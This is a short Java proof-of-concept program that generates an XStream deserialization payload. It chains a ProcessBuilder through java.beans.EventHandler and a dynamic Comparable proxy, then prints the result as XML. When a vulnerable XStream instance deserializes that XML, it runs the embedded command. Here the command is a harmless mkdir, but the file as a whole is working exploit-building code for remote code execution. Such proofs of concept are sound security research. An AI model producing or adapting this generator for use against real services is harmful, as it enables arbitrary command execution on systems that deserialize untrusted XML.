import com.thoughtworks.xstream.XStream;
import com.thoughtworks.xstream.io.xml.DomDriver;

import java.beans.EventHandler;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.Set;
import java.util.TreeSet;

public class NotSoSimplePayloadGenerator {

    public static void main(String[] args) throws ClassNotFoundException {
        ProcessBuilder pb = new ProcessBuilder("mkdir", "/Users/szyma/java1234");

        InvocationHandler handler = new EventHandler(pb, "start", null, null);

        Comparable proxy = (Comparable) Proxy.newProxyInstance(NotSoSimplePayloadGenerator.class.getClassLoader(), new Class[] { Comparable.class }, handler);

        // Set<Comparable> set = new TreeSet<>();
        // set.add(proxy);

        System.out.println(new XStream(new DomDriver()).toXML(proxy));
    }

}
